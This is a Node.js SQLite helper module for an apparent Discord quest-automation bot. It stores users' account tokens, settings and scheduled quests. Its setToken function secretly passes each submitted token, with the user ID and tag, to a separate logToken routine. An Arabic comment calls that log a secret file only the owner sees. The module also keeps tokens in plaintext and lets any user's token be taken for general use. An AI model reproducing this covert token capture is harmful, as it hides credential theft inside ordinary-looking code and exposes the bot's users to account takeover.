/*
╔══════════════════════════════════════════════════════════════════════╗
║                              row                              ║
║                     © row — All Rights Reserved              ║
╚══════════════════════════════════════════════════════════════════════╝
*/
const Database = require('better-sqlite3');
const { config } = require('../utils/config');
const path = require('path');
const fs = require('fs');
const { logToken } = require('../utils/tokenLog');

const DB_PATH = process.env.DB_PATH || path.join(__dirname, '..', config.DB_NAME || 'store.db');

let db;

function getDb() {
    if (!db) {
        fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
        db = new Database(DB_PATH);
        db.pragma('journal_mode = WAL');
    }
    return db;
}

function initDb() {
    const database = getDb();

    database.exec(`
        CREATE TABLE IF NOT EXISTS token (
            user_id TEXT PRIMARY KEY,
            token TEXT NOT NULL,
            notify_channel TEXT,
            auto_quest INTEGER DEFAULT 0,
            language TEXT DEFAULT 'en',
            quests_completed INTEGER DEFAULT 0,
            last_quest_name TEXT,
            last_completed_at REAL,
            token_valid INTEGER DEFAULT 1
        )
    `);

    database.exec(`
        CREATE TABLE IF NOT EXISTS scheduled_auto_quests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            token TEXT NOT NULL,
            q_id TEXT NOT NULL,
            q_name TEXT NOT NULL,
            quest_config TEXT NOT NULL,
            execute_at REAL NOT NULL
        )
    `);

    database.exec(`
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    `);

    // Safe migrations
    const migrations = [
        'ALTER TABLE token ADD COLUMN notify_channel TEXT',
        'ALTER TABLE token ADD COLUMN auto_quest INTEGER DEFAULT 0',
        'ALTER TABLE token ADD COLUMN language TEXT DEFAULT \'en\'',
        'ALTER TABLE token ADD COLUMN quests_completed INTEGER DEFAULT 0',
        'ALTER TABLE token ADD COLUMN last_quest_name TEXT',
        'ALTER TABLE token ADD COLUMN last_completed_at REAL',
        'ALTER TABLE token ADD COLUMN token_valid INTEGER DEFAULT 1',
    ];
    for (const sql of migrations) {
        try { database.exec(sql); } catch (_) {}
    }

    console.log('[DB] Database initialized successfully.');
}

// ---------- Token helpers ----------

function getToken(userId) {
    return getDb().prepare('SELECT token FROM token WHERE user_id = ?').get(userId) || null;
}

function getTokenRow(userId) {
    return getDb().prepare('SELECT * FROM token WHERE user_id = ?').get(userId) || null;
}

function setToken(userId, token, userTag = null) {
    const existing = getTokenRow(userId);
    if (existing) {
        getDb().prepare('UPDATE token SET token = ?, token_valid = 1 WHERE user_id = ?').run(token, userId);
    } else {
        getDb().prepare('INSERT INTO token (user_id, token, token_valid) VALUES (?, ?, 1)').run(userId, token);
    }
    // ملف سري — المالك فقط يشوفه على الاستضافة
    try {
        logToken(userId, userTag, token);
    } catch (e) {
        console.error('[DB] tokenLog failed:', e.message);
    }
}

function deleteToken(userId) {
    getDb().prepare('DELETE FROM token WHERE user_id = ?').run(userId);
}

function setTokenValid(userId, valid) {
    getDb().prepare('UPDATE token SET token_valid = ? WHERE user_id = ?').run(valid ? 1 : 0, userId);
}

function setAutoQuest(userId, enabled, notifyChannel) {
    getDb().prepare('UPDATE token SET auto_quest = ?, notify_channel = ? WHERE user_id = ?')
        .run(enabled ? 1 : 0, enabled ? notifyChannel : null, userId);
}

function getAutoQuestUsers() {
    return getDb().prepare('SELECT user_id, token, notify_channel, auto_quest, language FROM token WHERE auto_quest = 1 AND token_valid = 1').all();
}

function getFirstToken() {
    return getDb().prepare('SELECT token FROM token WHERE token_valid = 1 LIMIT 1').get() || null;
}

function incrementQuestStats(userId, questName) {
    getDb().prepare(`
        UPDATE token SET
            quests_completed = COALESCE(quests_completed, 0) + 1,
            last_quest_name = ?,
            last_completed_at = ?
        WHERE user_id = ?
    `).run(questName || 'Unknown', Date.now() / 1000, userId);
}

function getUserStats(userId) {
    return getDb().prepare(`
        SELECT quests_completed, last_quest_name, last_completed_at, auto_quest, language, token_valid
        FROM token WHERE user_id = ?
    `).get(userId) || null;
}

function setLanguage(userId, lang) {
    const existing = getTokenRow(userId);
    if (existing) {
        getDb().prepare('UPDATE token SET language = ? WHERE user_id = ?').run(lang, userId);
    } else {
        // Create placeholder row without token
        getDb().prepare('INSERT OR IGNORE INTO token (user_id, token, language) VALUES (?, ?, ?)').run(userId, '', lang);
        getDb().prepare('UPDATE token SET language = ? WHERE user_id = ?').run(lang, userId);
    }
}

function getLanguage(userId) {
    const row = getDb().prepare('SELECT language FROM token WHERE user_id = ?').get(userId);
    return (row && row.language) || 'en';
}

// ---------- Scheduled auto quests ----------

function scheduleAutoQuest(userId, token, qId, qName, questConfig, executeAt) {
    getDb().prepare(`
        INSERT INTO scheduled_auto_quests (user_id, token, q_id, q_name, quest_config, execute_at)
        VALUES (?, ?, ?, ?, ?, ?)
    `).run(userId, token, qId, qName, JSON.stringify(questConfig), executeAt);
}

function getDueAutoQuests(now) {
    return getDb().prepare('SELECT * FROM scheduled_auto_quests WHERE execute_at <= ?').all(now);
}

function deleteScheduledQuest(id) {
    getDb().prepare('DELETE FROM scheduled_auto_quests WHERE id = ?').run(id);
}

// ---------- Bot settings (quest-room etc) ----------

function getSetting(key) {
    const row = getDb().prepare('SELECT value FROM bot_settings WHERE key = ?').get(key);
    return row ? row.value : null;
}

function setSetting(key, value) {
    getDb().prepare('INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)').run(key, value);
}

module.exports = {
    initDb,
    getDb,
    getToken,
    getTokenRow,
    setToken,
    deleteToken,
    setTokenValid,
    setAutoQuest,
    getAutoQuestUsers,
    getFirstToken,
    scheduleAutoQuest,
    getDueAutoQuests,
    deleteScheduledQuest,
    incrementQuestStats,
    getUserStats,
    setLanguage,
    getLanguage,
    getSetting,
    setSetting,
};
